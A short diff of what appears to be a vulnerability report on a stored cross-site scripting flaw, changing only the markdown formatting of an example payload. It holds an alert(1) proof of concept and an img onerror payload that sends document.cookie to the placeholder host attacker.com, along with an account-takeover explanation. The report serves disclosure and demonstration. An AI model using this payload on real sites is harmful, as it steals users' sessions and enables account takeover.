@@ -71,7 +71,7 @@ tix5uni'"><img src=x onerror=alert(1)>
 - Every authenticated user who visits the reports page gets the payload executed in their browser automatically
 - Full account takeover without needing passwords
 - Real attack payload would be:
-<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">
+``<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">``
 - This silently sends the victim's session cookie to the attacker's server
 - Attacker pastes that cookie into their browser and is immediately logged in as the victim — no password needed
 
